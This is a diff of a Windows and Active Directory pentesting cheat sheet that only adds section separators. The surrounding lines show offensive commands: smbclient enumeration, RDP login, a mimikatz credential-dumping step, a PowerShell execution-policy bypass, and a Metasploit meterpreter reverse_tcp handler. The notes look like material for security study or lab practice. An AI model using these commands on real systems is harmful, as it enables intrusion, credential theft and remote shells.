@@ -51,6 +51,7 @@ regedit
 ##### Group policy objects
 a collection of settings that can be applied to OUs
 
+---
 #### SMB enumeration 
 
 enumerate
@@ -86,6 +87,7 @@ connect with smbclient
 smbclient \\\\$IP\\nt4wrksv
 ```
 
+---
 #### rdp 
 
 ```bash
@@ -94,6 +96,7 @@ rdesktop -u Administrator -d CONTROLLER $IP
 remmina 
 ```
 
+---
 #### AD
 
 extract credentials and secrets from a systemdump
@@ -157,6 +160,7 @@ misc::cmd #open cmd with elevated priveleges to all machines
 links
 * [WADComs (AD)](https://wadcoms.github.io/)
 
+---
 #### enumeration
 
 run powershell with bypass execution policy
@@ -216,6 +220,7 @@ Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue
 - [LOLBAS (windows)](https://lolbas-project.github.io/)
 - [JAWS](https://github.com/411Hall/JAWS)
 - [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
+---
 #### other
 download file
 ```
@@ -234,6 +239,7 @@ set lport lhost
 set PAYLOAD windows/meterpreter/reverse_tcp
 run -j (in background)
 ```
+---
 #### links
 ##### windows
 - [bloodhound-docker](https://github.com/belane/docker-bloodhound)
